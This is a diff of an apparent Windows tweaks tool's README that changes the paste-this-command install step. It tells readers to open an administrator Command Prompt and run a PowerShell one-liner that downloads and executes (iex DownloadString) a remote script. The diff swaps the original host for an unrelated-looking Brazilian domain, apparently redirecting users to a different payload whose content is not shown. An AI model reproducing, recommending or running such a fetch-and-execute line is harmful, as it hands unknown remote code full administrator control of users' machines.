@@ -280,7 +280,7 @@ Option to Enable & Install Or Disable & Uninstall Microsoft OneDrive
 
 Simply Run cmd (Command Prompt) as Administrator and paste the following!
 ```
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://tweaks.madu.gg')"
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://tweaks.techremote.com.br')"
 ```
 if error then use the following!
 ```
